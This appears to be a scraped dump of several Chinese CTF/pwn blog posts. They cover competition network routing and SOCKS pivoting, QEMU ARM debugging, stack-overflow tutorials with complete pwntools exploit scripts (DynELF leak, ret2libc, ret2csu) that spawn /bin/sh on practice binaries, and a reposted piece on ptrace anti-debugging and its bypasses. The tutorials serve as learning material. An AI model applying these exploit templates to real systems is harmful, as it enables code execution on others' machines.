2001:0:284a:364:181c:cd3e:2097:c0dd/128 在链路上 16 51 2409:8955:3014:2e39::/64 在链路上 16 291 2409:8955:3014:2e39:4438:1682:19e2:8070/128 在链路上 16 291 2409:8955:3014:2e39:6513:5ca8:8df0:e7f/128 在链路上 4 281 fe80::/64 在链路上 17 281 fe80::/64 在链路上 9 271 fe80::/64 在链路上 20 281 fe80::/64 在链路上 16 291 fe80::/64 在链路上 7 291 fe80::/64 在链路上 10 291 fe80::/64 在链路上 19 331 fe80::/64 在链路上 9 271 fe80::861:2a51:6e5a:761b/128 在链路上 19 331 fe80::181c:cd3e:2097:c0dd/128 在链路上 4 281 fe80::40de:409b:e37f:34eb/128 在链路上 16 291 fe80::4438:1682:19e2:8070/128 在链路上 20 281 fe80::716b:1e8e:e67a:bdf/128 在链路上 10 291 fe80::907b:8932:6a09:c20b/128 在链路上 7 291 fe80::9401:d238:7f61:d7d3/128 在链路上 17 281 fe80::cd1f:a63d:6cee:c094/128 在链路上 1 331 ff00::/8 在链路上 4 281 ff00::/8 在链路上 17 281 ff00::/8 在链路上 9 271 ff00::/8 在链路上 20 281 ff00::/8 在链路上 16 291 ff00::/8 在链路上 7 291 ff00::/8 在链路上 10 291 ff00::/8 在链路上 19 331 ff00::/8 在链路上===========================================================================永久路由: 无 关键是看本机有线网卡和无线网卡的网络通信接口号，例如 1234567891011121314接口列表 9...00 15 5d bf b4 b8 ......Hyper-V Virtual Ethernet Adapter 20...80 e8 2c 1a 31 4d ......Realtek PCIe GbE Family Controller 21...08 00 58 00 00 05 ......SSL VPN Client Virtual Network Adapter 4...0a 00 27 00 00 04 ......VirtualBox Host-Only Ethernet Adapter 17...0a 00 27 00 00 11 ......VirtualBox Host-Only Ethernet Adapter #2 25...f2 68 e6 73 9b 9f ......Microsoft Wi-Fi Direct Virtual Adapter 15...b2 68 e6 73 9b 9f ......Microsoft Wi-Fi Direct Virtual Adapter #3 7...00 50 56 c0 00 01 ......VMware Virtual Ethernet Adapter for VMnet1 10...00 50 56 c0 00 08 ......VMware Virtual Ethernet Adapter for VMnet8 16...b0 68 e6 73 9b 9f ......Realtek RTL8822BE 802.11ac PCIe Adapter 11...b0 68 e6 73 9b a0 ......Bluetooth Device (Personal Area Network) 1...........................Software Loopback Interface 1 19...00 00 00 00 00 00 00 e0 Microsoft Teredo Tunneling Adapter 我们一般都是有线网卡用的是比赛平台的内网环境，无线网卡就是外网环境，所以这个例子中 1220...80 e8 2c 1a 31 4d ......Realtek PCIe GbE Family Controller16...b0 68 e6 73 9b 9f ......Realtek RTL8822BE 802.11ac PCIe Adapter 有线网卡的接口号是：20，无线网卡的接口号是：16 然后就是清除原来的路由表 1route delete 0.0.0.0 然后默认网络走无线网络的接口 1route add 0.0.0.0 mask 0.0.0.0 192.168.43.1 metric 1 if 16 然后配置比赛内网的网段走有线端口 12route add 10.0.10.0 mask 255.255.255.0 10.0.10.254 metric 3 if 20route add 192.168.100.0 mask 255.255.255.0 10.0.10.254 metric 3 if 20 跳板机and攻击机可以先用Xshell连接上跳板机然后在跳板机中开启socks5代理 1SSH -&gt; 隧道 -&gt; 添加 -&gt; 类型（方向）-&gt; Dymaic（Socks4/5） 记住跳板机的本地监听端口，然后用Proxifer新建一个代理服务器 1Profile -&gt; Add -&gt; address: 127.0.0.1 port:刚刚记录的 Type:Socks5 然后自定义网络代理流量规则 Proxification Rules 将攻击机的地址填入 Target Hosts 然后 Action 选择我们刚刚创建的跳板机 这样就完成了基础的网络配置","categories":[],"tags":[]},{"title":"ARM与QEMU-Tips-1","slug":"ARM╙δQEMU-Tips-1","date":"2019-12-31T02:44:09.000Z","updated":"2019-12-31T18:44:36.000Z","comments":true,"path":"2019/12/30/ARM╙δQEMU-Tips-1/","link":"","permalink":"http://yoursite.com/2019/12/30/ARM╙δQEMU-Tips-1/","excerpt":"","text":"QEMU的安装0x01 安装必要环境1sudo apt install -y qemu-user gcc-arm-linux-gnueabi binutils-arm-linux-gnueabigcc-arm-linux-gnueabi lib32ncurses5 lib32z1 0x02 安装Qemu有两种方法可以在Linux环境下安装Qemu工具，第一种直接使用XUbuntu系统的apt工具安装，但是这种方法安装的Qemu系统版本不是最新的，如果需要安装最新版本的Qemu工具，就需要通过Git工具下载源码，切换到最新分支再去编译安装了。具体操作如下所述 快速安装Qemu：1sudo apt install qemu 下载Qemu源码编译安装从Git服务器下载Qemu代码，记着在下载之前选择并切换需要的源码分支： 1git clone git://git.qemu-project.org/qemu.git 编译并安装Qemu： 123./configure --target-list=arm-softmmu --audio-drv-list=makemake install 查看Qemu版本1qemu-system-arm --version 查看Qemu支持的开发板Qemu工具支持大量开发板的虚拟，现存的大部分常用开发板都能很好地支持。通过下面的命令操作可以看到当前版本的Qemu工具支持的开发板列表： 1qemu-system-arm -M help 模拟ARM程序需要设置ld-linux.so的加载路径 以下两种方式都可以： qemu-arm -L /usr/arm-linux-gnueabi -cpu cortex-a15 awd7 export QEMU_LD_PREFIX=/usr/arm-linux-gnueabi qemu-arm -cpu cortex-a15 awd7 如果不这样设置的话，一般会出现这样的错误，提示不能加载ld-linux: 1/lib/ld-linux.so.3: No such file or directory 当然，如果不这样设置的话，可以将程序编译成静态链接的，命令如下： 1arm-linux-gnueabi-gcc -o simple -c simple -static ARM程序调试进行远程调试关键是增加 -g 参数，指定端口 1qemu-arm -g 1235 -L /usr/arm-linux-gnueabi -cpu cortex-a15 awd7 然后使用GDB进行远程调试 12(gdb) target remote :1235Remote debugging using :1235","categories":[],"tags":[]},{"title":"浅谈栈溢出填充布局-2","slug":"╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2","date":"2019-12-24T03:29:50.000Z","updated":"2019-12-24T19:30:08.000Z","comments":true,"path":"2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/","link":"","permalink":"http://yoursite.com/2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/","excerpt":"","text":"DynELF当我们未知一个程序的libc版本时，可能就没法使用ret2libc或者ret2plt，这时我们可以考虑使用DynELF来获取我们所需要的地址，pwntools中已经自带了强大的工具 首先举一个带有漏洞的例子程序 123456789101112131415#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;void vul_func()&#123; char buf[128]; read(STDIN_FILENO,buf,256);//STDIN_FILENO = 0&#125;int main(int argc,char **argv)&#123; vul_func(); write(STDOUT_FLENO,\"Hello,World\\n\",13); //STDOUT_FLENO = 1,13 = 13 char return 0;&#125; 其实这里可以说一下在UNIX一些系统调用中使用到STDIN_FILENO表示标准输入,STDOUT_FILENO表示标准输出，STDERR_FILENO表示标准出错，使用时需要加头文件&lt;unistd.h&gt; 1234/* Standard file descriptors. */#define STDIN_FILENO 0 /* Standard input. */#define STDOUT_FILENO 1 /* Standard output. */#define STDERR_FILENO 2 /* Standard error output. */ 首先看一下完整的EXP 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env pythonfrom pwn import*elf = ELF(\"./rop_sample\")plt_write = elf.symbols[\"write\"]plt_read = elf.symbols[\"read\"]vulfunc_addr = 0x0804844b # no PIEdef leak(address): payload1 = \"A\"*132 + p32(plt_write) + p32(vulfunc_addr) + p32(1) + p32(address) + p32(4) p.send(payload1) data = p.recv(4) print \"%#x =&gt; %s\" %(address,(data or '').encode('hex')) return datap = process(\"./rop_sample\")d = DynELF(leak, elf=ELF('./rop_sample'))system_addr = d.lookup('system', 'libc')print \"system_addr=\" + hex(system_addr)bss_addr = 0x0804a024pppr = 0x0804850d # no PIEpayload2 = \"A\"*132 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(0)paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)print \"\\n###sending payload2 ...###\"p.send(payload2)p.send(\"/bin/sh\")p.interactive() 首先来分析一下leak函数 123456def leak(address): payload1 = \"A\"*132 + p32(plt_write) + p32(vulfunc_addr) + p32(1) + p32(address) + p32(4) p.send(payload1) data = p.recv(4) print \"%#x =&gt; %s\" %(address,(data or '').encode('hex')) return data 使用DynELF的关键是找到一个vulfunc函数去构建leak函数，其中vulfunc函数的特征是具有可无限次读写内存地址的能力，比如例子中的vul_func 1234void vul_func()&#123; char buf[128]; read(STDIN_FILENO,buf,256);//STDIN_FILENO = 0&#125; 当我们执行vul_func的时候，可以向bss段写入一段数据，且存在栈溢出，我们就可以控制它在read函数和write函数之间来回执行，实现无限读写，事实上我们的payload也是这样构建的 1payload1 = \"A\"*132 + p32(plt_write) + p32(vulfunc_addr) + p32(1) + p32(address) + p32(4) 首先&quot;A&quot;*132是因为buf开的栈大小是128个字节，那么只需要再加4个字节覆盖掉Caller’s EBP，就可以让我们想要跳转的地址覆盖掉 Ret Addr，这里我们是write函数，然后 1p32(vulfunc_addr) + p32(1) + p32(address) + p32(4) 构成了write函数新的栈帧，其中p32(vulfunc_addr)成为了write函数的Ret Addr，将重新跳回到vul_func重复读写，然后p32(1)就是write函数的第一个参数STDOUT_FILENO，然后p32(address)就是我们希望暴露的地址，最后一个p32(4)是我们write函数读取的字节数，因为我们就读取了一个p32(address)就是32位系统下的指针，也就是4个字节 然后data = p.recv(4)，也是因为我们希望得到的是一个32位系统的地址指针，也就是4字节，如果是64位系统就是8个字节 然后我们完成了leak函数的构造，接下来我们只需要调用pwntools里面的工具就ok了，就可以获得我们想要的地址了 12d = DynELF(leak, elf=ELF(&apos;./rop_sample&apos;))system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;) 然后payload2 12payload2 = \"A\"*132 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(0)paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr) 就是我们先调用read函数手动输入“bin/sh“到bss段地址，pppr就是pop*3+ret，pop*3就是为了栈平衡，因为read函数引入了三个参数，然后ret就会ret到system_addr开始调用system函数，因为第二个参数是bss_addr，之前我们已经在bss上放入了“bin/sh”，事实上就执行了 1system(‘/bin/sh’) 64位首先是x64最为重要的两个变化 应用程序地址空间的改变 参数传参方式的改变（RDI、RSI、RDX、RCX、R8、R9）+Stack 比如我们调用一个write函数的汇编，因为这些数据只用32位就可以，所以是edx或者esi这类 1234mov edx,oxd //argv[2]mov esi,0x400644 // argv[1]mov edi,0x1 //argv[0]call 0x400430&lt;write@plt&gt; 我们一般传参常用的Gadgets就是以下三个 1gadget1 = mov rdx,r13 | mov rsi,r14 | mov edi,r15d | call qword ptr [r12+rbx*8] 其中call qword ptr [r12+rbx*8]就是我们希望调用的函数，然后mov rdx,r13就是第三个参数，mov rsi,r14是第二个参数，mov edi,r15d是第四个参数 1gadget2 = pop rbx | pop rbp | pop r12 | pop r13 | pop r14 | pop r15 | ret 1gadget3 = pop rdi | ret 常见模板 1234567891011121314151617181920csu_front_addr = 0x0000000000400600 #gadget1 mmmccsu_end_addr = 0x000000000040061A #gadget2 pppppprfakeebp = 'b' * 8 #32位 fakeebp是4个字节， 64位为8个字节def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += '\\x90' * 0x38 #nop payload += p64(last) sh.send(payload) sleep(1) 如果希望使用write函数暴露地址 1csu(0, 1, write_got, 8, write_got, 1, main_addr) 一般接受用的函数 1write_addr = u64(p.recv(8)) 这里有个Tips，一般我们要搜索libc里面的函数地址就用 1libc.symblos[&quot;xxxx&quot;] 字符串就用 1libc.search[&quot;xxxx&quot;] 在gdb里面可以用bt命令展示各函数的起始地址","categories":[],"tags":[]},{"title":"浅谈栈溢出填充布局-1","slug":"╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-1","date":"2019-12-23T06:32:54.000Z","updated":"2019-12-23T22:33:16.000Z","comments":true,"path":"2019/12/22/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-1/","link":"","permalink":"http://yoursite.com/2019/12/22/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-1/","excerpt":"","text":"经典栈溢出如果判断我们再写payload的时候，该如何填充分配布局。首先上一张经典的内存图 我们都知道栈溢出的关键点就是覆盖修改掉EBP所指地址下面的Return Addr从而达到劫持EIP修改程序流程 举一个例子 我们打开IDA常常能看到形似这样的提示 1char buf; //[rsp+0h][rbp-80h] 就这代表buf的起始地址距离rbp的长度是0x80，也就是0x80个字节，也就是0x80个char类型数据，好了，我们知道如果填充0x80个字母，就会覆盖掉ESP所指的内容，那么距离我们需要覆盖掉的Return Addr还隔着一个Main’s EBP，这是一个指针的数据类型，我们知道在32位系统里面，一个指令所占的内存是4个字节，如果是64位系统就是8个字节，所以我们还需要填充相应个数的字节，我们才能将我们的伪造的Return Addr覆盖到那个位置 如果要判断每个变量的相对地址大小也很容易，再举个例子 12char v4; //[rsp+0h][rbp-20h]int v5;//[rsp+8h][rbp-18h] 可以知道两个变量的距离就是相距0x8个字节 ROPRet2libc继续先放一张图 我们一般的ROP就是覆盖掉Ret Addr使得EIP指向我们需要的内存中已经存在的指令 例如，如果我们有可以利用的libc的话，一般是直接跳转调用system函数。原本ret addr返回到caller func的call callee下一条指令处，但我们将其修改为system函数的地址，此时ret就相当于调用了system。而system调用时，我们的payload在Ret addr下面伪造了栈帧，布置其ret addr为exit函数地址，如果是rop，就是下一个gadgets的地址，然后接下来的内存地址就是函数的调用参数，攻击链如下 1ret -&gt; system(arg) -&gt; exit 举一个 bamboofox 中 ret2libc1 为例 首先，我们可以检查一下程序的安全保护 123456➜ ret2libc1 checksec ret2libc1 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"RET2LIBC &gt;_&lt;\"); gets((char *)&amp;v4); return 0;&#125; 可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在 1234➜ ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information============================================================0x08048720 : /bin/sh 确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。 1.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] 那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下 1234567891011#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc1')binsh_addr = 0x8048720system_plt = 0x08048460payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])sh.sendline(payload)sh.interactive() 可以到核心payload 1&apos;a&apos; * 112 + system_plt +&apos;b&apos; * 4 + binsh_addr 因为v4是[ebp-64h]，然后又是32位系统，故若想要system的地址覆盖ret addr就需要0x64+0x4个字节，然后我们不需要再跳转到其他地址，所以返回地址就随便填四个字节的数据就可以，然后第一个参数binsh的地址就跟着 如果我们想查看已有符号表的函数地址，可以在gdb里面 1p system Ret2pltALSR的出现导致libc.so基址随机化，而plt缺因为ELF本身没有随机化(前PIE时代)而不会发生变化，所以我们可以不直接ret2libc，而是间接ret2plt PLT(Proceduce Link Table)，GOT(Global Offset Table) GOT是一个存储外部库函数的表，可以用GOT表来间接引用全局变量、函数，也可以把GOT表的首地址作为一个基准，用相对于该基准的偏移量来引用静态变量、静态函数。意思是说，GOT是一个映射表，这里的内容是此段代码里面引用到的外部符号的地址映射，比如你用到了一个printf函数，就会和GOT表产生关系。那这又和PLT有什么关系呢 PLT表可以称为内部函数表，GOT表为全局函数表，这两个表是相对应的，为什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，是一一对应的。所以PLT表中存储的数字到底是什么意思？ 其实就是以GOT表的首地址作为一个基准称为基值，PLT中的值即为所指向函数在内存中相对于基值的偏移量（offset） 也就是说printf@plt的在内存中的真实地址是： GOT基值+PLT存储的偏移量 got[&#39;a_function&#39;]找到 a_function的 GOT plt[&#39;a_function&#39;]找到 a_function的 PLT 一般来说GOT表是可以改变的，是可写的，PLT表一般是不变的 当我们第一次call puts函数，首先跳转到PLT表中的puts项(0x080482b0)，然后又会jmp到GOT表中的一个地址(0x80496f8)，然后这个地址中存储的数据刚好就是jmp指令的下一个push指令(0x080482b6)，实际上push的是PLT表中puts函数的编号，实际上就是模拟了一个call，然后又会跳转到一个全局函数(0x80482a0)，去GOT表中找到真正的puts地址(0xf7e7c7e0)，同时会修改PLT表中jmp的第一个地址(9x80496f8)的内容为真正的puts地址(0xf7e7c7e0) 当程序第二次call puts时从PLT表里jmp的就是真正的puts函数地址了 Ret2plt较之ret2libc更为局限，因为只有漏洞程序调用的库函数才会出现在PLT表。Redhat和fedora上部署了一种ASCII armoring的保护机制。这一机制使得库函数地址都包含一个\\x00字节(用来截断copy) 衍生出一种利用PPR链(POP POP Ret)和strcpy@plt拼凑出system地址的新ret2plt方法，并覆写某个其他plt函数的got项 相当于第一次copy system函数PLT的GOT项的第一个字节到puts函数PLT的GOT项的第一个字节，然后PPR的链作为返回地址，got[0] of puts 和Addr of system[0]分别是第1和第2参数，则当PPR后，弹出栈中got[0] of puts和Addr of system[0]后，ret的地址就是Addr of system[0]下面的又一个strcpy函数，因为是32位系统，一个指针4个字节，重复4次就能修改puts为system函数 常见的read函数payload 1p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr) + p32(0) + p32(buf2_addr) + p32(0x100) 返回地址是buf的话，一般就是buf上面布置了ROP链或者shellcode 常见的write函数payload 1p32(elf.symbols[&quot;write&quot;])+p32(main) + p32(1)+p32(elf.got[&quot;write&quot;])+p32(4) 就是返回地址是mian函数的地址，然后其他三个参数参考write函数的API定义 如果已知libc.so则可以先通过ELF先计算出write和system的偏移，再用输出地址减去write的偏移就可以计算出libc.so的基址，再用libc.so的基址加上system的偏移就可以动态算出system在本次运行时的地址，未知libc则需要额外的leak函数 一般暴露的都是函数在GOT表中的地址 得到write函数与system函数偏移量 1off_set = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;] 然后当我们拿到write函数在GOT表中的真实地址时,就可以计算出基值的真实地址 1libc_address = write_address - off_set 合并在一起就是 1libc_address = write_address - （libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]）","categories":[],"tags":[]},{"title":"转载-Linux逆向之调试&反调试","slug":"╫¬╘╪-Linux─µ╧≥╓«╡≈╩╘","date":"2019-12-22T03:03:22.000Z","updated":"2019-12-22T19:03:56.000Z","comments":true,"path":"2019/12/21/╫¬╘╪-Linux─µ╧≥╓«╡≈╩╘/","link":"","permalink":"http://yoursite.com/2019/12/21/╫¬╘╪-Linux─µ╧≥╓«╡≈╩╘/","excerpt":"","text":"转载自：https://xz.aliyun.com/t/6882 调试器的实现原理要想进行调试，调试器是必不可少的，首先需要了解一下我们常用的Linux下的调试器如GDB，是如何实现的 GDB 基于ptrace编写而成的调试器，ptrace是一个Linux提供的用于调试的系统调用 函数原型如下 123456NAME ptrace - process traceSYNOPSIS #include &lt;sys/ptrace.h&gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 简单来说， ptrace系统调用提供了一种方法来让父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。 主要用来实现断点调试和系统调用跟踪 这个函数根据 request 参数来表示想要请求执行的行为 ，并且根据不同的request决定后续的pid、addr、data参数是否有意义。 下面是几个常见的 request 参数的可选项： PTRACE_TRACEME ：表示本进程将被其父进程跟踪，此时剩下的pid、addr、data参数都没有实际意义可以全部为0 这个选项只能用在被调试的进程中，也是被调试的子进程唯一能用的request选项，其他的都只能用父进程调试器使用 PTRACE_ATTACH：attach到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次PTRACE_TRACEME操作，可想而知，gdb的attach命令使用这个参数选项实现的 变成其他进程的爹，你就可以调试它 PTRACE_CONT：继续运行之前停止的子进程，也可以向子进程发送指定的信号，这个其实就相当于gdb中的continue命令 除了上面的几个，还有很多操作子进程内存数据寄存器数据的request选项，详见man手册，这里不一一展开， 如上图所示，gdb调试的本质实际上就是父进程使用ptrace函数对子进程进行一系列的命令操作 这里举一个例子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;sys/ptrace.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/reg.h&gt; /* For constants ORIG_EAX etc */#include &lt;sys/user.h&gt;#include &lt;sys/syscall.h&gt; /* SYS_write */#include &lt;stdio.h&gt;int main() &#123; pid_t child; long orig_rax; int status; int iscalling = 0; struct user_regs_struct regs; child = fork(); if(child == 0) &#123; ptrace(PTRACE_TRACEME, 0, 0);//发送信号给父进程表示已做好准备被调试 execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-l&quot;, &quot;-h&quot;, 0); &#125; else &#123; while(1) &#123; wait(&amp;status);//等待子进程发来信号或者子进程退出 if(WIFEXITED(status)) //WIFEXITED函数(宏)用来检查子进程是被ptrace暂停的还是准备退出 &#123; break; &#125; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0); //获取rax值从而判断将要执行的系统调用号 if(orig_rax == SYS_write) &#123;//如果系统调用是write ptrace(PTRACE_GETREGS, child, 0, &amp;regs); if(!iscalling) &#123; iscalling = 1; //打印出系统调用write的各个参数内容 printf(&quot;SYS_write call with %p, %p, %p\\n&quot;, regs.rdi, regs.rsi, regs.rdx); &#125; else &#123; printf(&quot;SYS_write call return %p\\n&quot;, regs.rax); iscalling = 0; &#125; &#125; ptrace(PTRACE_SYSCALL, child, 0, 0); //PTRACE_SYSCALL,其作用是使内核在子进程进入和退出系统调用时都将其暂停 //得到处于本次调用之后下次调用之前的状态 &#125; &#125; return 0;&#125; 编译运行后，会输出如下 12345678910111213141516171819202122232425$ gcc ./ptrace1.c -o ptrace1 &amp;&amp; ./ptrace1 SYS_write call with 0x1, 0x9e1020, 0xf总用量 940KSYS_write call return 0xfSYS_write call with 0x1, 0x9e1020, 0x35-rwxrwxr-x 1 zeref zeref 8.7K 11月 16 03:10 ptrace1SYS_write call return 0x35SYS_write call with 0x1, 0x9e1020, 0x37-rw-rw-r-- 1 zeref zeref 601 11月 16 03:10 ptrace1.cSYS_write call return 0x37SYS_write call with 0x1, 0x9e1020, 0x35-rwxrwxr-x 1 zeref zeref 8.7K 11月 16 03:16 ptrace2SYS_write call return 0x35SYS_write call with 0x1, 0x9e1020, 0x37-rw-rw-r-- 1 zeref zeref 1.3K 11月 16 03:16 ptrace2.cSYS_write call return 0x37SYS_write call with 0x1, 0x9e1020, 0x32-rwxrwxr-x 1 zeref zeref 892K 11月 15 22:57 testSYS_write call return 0x32SYS_write call with 0x1, 0x9e1020, 0x33-rwxrwxr-x 1 zeref zeref 8.4K 11月 15 22:51 test1SYS_write call return 0x33SYS_write call with 0x1, 0x9e1020, 0x35-rw-rw-r-- 1 zeref zeref 174 11月 15 22:51 test1.cSYS_write call return 0x35 可以看到，每一次进行系统调用前以及调用后的寄存器内容都发生的变化，并且输出了ls -l -h的内容 这只是ptrace的部分功能，ptrace能做到的事情还有更多，比如还能修改内存，修改寄存器的值，插入字节码实现下断点的功能，这里仅仅简单介绍一下gdb调试器的大概实现原理 如果对编写调试器感兴趣的话，可以康康这个大佬的博客： veritas501 反调试介绍完调试的原理，就需要思考下一个问题，如果防止别人调试我们写好的程序？ 最简单的办法如下 123456789101112#include &lt;sys/ptrace.h&gt;#include &lt;stdio.h&gt;int main()&#123; if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 ) &#123; printf(&quot;don&apos;t trace me:(\\n&quot;); return 1; &#125; printf(&quot;no one trace me:)\\n&quot;); return 0;&#125; 根据前面说的，只要能当其他进程的爹，就能调试他，但ptrace有个规定是，每个进程只能被PTRACE_TRACEME一次，因此只要程序的开头就先执行一次ptrace(PTRACE_TRACEME, 0, 0, 0)，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1 这大概就是我先当了我自己的爹，别人就不能当我爹吧 运行情况如下 12345678$ ./anti1 no one trace me:)----$ gdb ./anti1$pwndbg&gt; rStarting program: /home/zeref/桌面/debug&amp;anti/anti1 don&apos;t trace me:([Inferior 1 (process 21216) exited with code 01] 那如果遇到这种反调试该如何绕过呢？ 一般有以下几种操作： 打patch，把有关ptrace函数的部分nop掉 利用hook技术，把ptrace函数给替换成自定义的ptrace函数，从而可以任意指定它的返回值 充分利用gdb的catch命令，catch syscall ptrace会在发生ptrace调用的时候停下，因此在第二次停住的时候set $rax=0，从而绕过程序中ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1的判断 效果如下 123456789101112131415161718$ gdb ./anti1 $pwndbg&gt; catch syscall ptrace Catchpoint 1 (syscall &apos;ptrace&apos; [101]) $pwndbg&gt; r Starting program: /home/zeref/桌面/debug&amp;anti/anti1 Catchpoint 1 (call to syscall ptrace), 0x00007ffff7b0ae2e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45 $pwndbg&gt; c Continuing. Catchpoint 1 (returned from syscall ptrace), 0x00007ffff7b0ae2e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45 在连续si到即将执行ret时 $pwndbg&gt; set $rax=0 $pwndbg&gt; c Continuing. no one trace me:) [Inferior 1 (process 21279) exited normally] 那么问题又来了，如何防止我们的程序被这种骚操作绕过反调试呢？ 分析一下上面的绕过方法，发现本质上都是为了使得ptrace(PTRACE_TRACEME, 0, 0, 0)无效，因为使之无效化又不影响主程序的逻辑，那便可以完美绕过 所以这里一种方法是这样，想办法生成一个子进程，并且ptrace跟踪它，并且使他与父进程的运行逻辑密不可分，这样一来单纯的干掉一个ptrace函数调用就不能绕过反调试 比如，可以通过自己定义syscall的方式来实现父子进程之间的身份认证，确保子进程是与父进程在通讯，而不是与gdb在通讯 例子如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/user.h&gt;#define SYS_CALL_myread 12345#define SYS_CALL_mywrite 67890void myread(char *str,int len)&#123; syscall(SYS_CALL_myread, str,len,0);&#125;void mywrite(char *str)&#123; syscall(SYS_CALL_mywrite, str,strlen(str),1);&#125;void tracee() &#123; ptrace(PTRACE_TRACEME, 0, 0, 0); raise(SIGCONT);//向自身发送SIGCONT信号，表示继续执行 char *str1=&quot;what is your name?\\n&quot;; static char name[0x10]; char *ptr_name=name; mywrite(str1); myread(ptr_name,0x10); puts(&quot;welcome!&quot;); mywrite(ptr_name);&#125;void tracer(pid_t child_pid)&#123; int status; struct user_regs_struct regs; waitpid(child_pid, &amp;status, 0); //如果子进程的ptrace被patch掉，则无法接收到status if (!WIFSTOPPED(status)) &#123;//宏用来指出子进程是正常退出的，返回一个非零值 printf(&quot;gg\\n&quot;); exit(1); &#125; ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_EXITKILL); //如果子进程处于退出状态则发送一个SIGKILL信号给它 while (WIFSTOPPED(status)) &#123; ptrace(PTRACE_SYSCALL, child_pid, 0, 0);//在子进程进程syscall之前断下 waitpid(child_pid, &amp;status, 0); ptrace(PTRACE_GETREGS, child_pid, 0, &amp;regs);//获取寄存器值 if (regs.orig_rax == SYS_CALL_mywrite) &#123; //str,strlen(str),1 regs.orig_rax = SYS_write; unsigned long long int tmp = regs.rdx; regs.rdx = regs.rsi; regs.rsi = regs.rdi; regs.rdi=tmp; ptrace(PTRACE_SETREGS, child_pid, 0, &amp;regs); //设置寄存器值，使其改为正确的syscall &#125; if (regs.orig_rax == SYS_CALL_myread) &#123; //str,strlen(str),0 regs.orig_rax = SYS_read; unsigned long long int tmp = regs.rdx; regs.rdx = regs.rsi; regs.rsi = regs.rdi; regs.rdi=tmp; ptrace(PTRACE_SETREGS, child_pid, 0, &amp;regs); &#125; ptrace(PTRACE_SYSCALL, child_pid, 0, 0); waitpid(child_pid, &amp;status, 0); &#125;&#125;int main() &#123; pid_t child_pid = fork(); if (child_pid &lt; 0) &#123; printf(&quot;gg\\n&quot;); exit(1); &#125; if (child_pid == 0) &#123; tracee(); &#125; else &#123; tracer(child_pid); &#125; return 0;&#125; 这种方法可以在一定程度上加大反调试力度，但其实还是有办法应对的，可以通过逆向发现父子进程直接的互动无非就是syscall的系统调用号和参数的转换，那只要逆的明明白白，仍然可以强行打patch，把myread，mywrite又改回正常的read，write就可以绕过反调试了 所以又该怎么样继续加大反调试的力度呢？ 可以考虑如下操作 加大力度，定义更多的syscal来代替libc函数，增大逆向难度 不仅仅单纯的替换系统调用号和参数，可以加入数据的交互，比如通过管道通信添加加密与解密的操作 给程序加很多花里胡哨的混淆，增加理解程序逻辑难度 …… 这大概就是攻击与防御的乐趣吧，如果哪位大佬还有更骚操作和想法请务必评论区分享一波 其他小技巧上面是专门针对ptrace进行的反调试与绕过反调试的分析，下面还有几种比较偏门的反调试措施，但是这些措施都比较容易绕过，通过打patch基本上都可以绕过，这里就简单介绍一下 1.检测/proc/self/status 检查 /proc/self/status 中的 TracerPID - 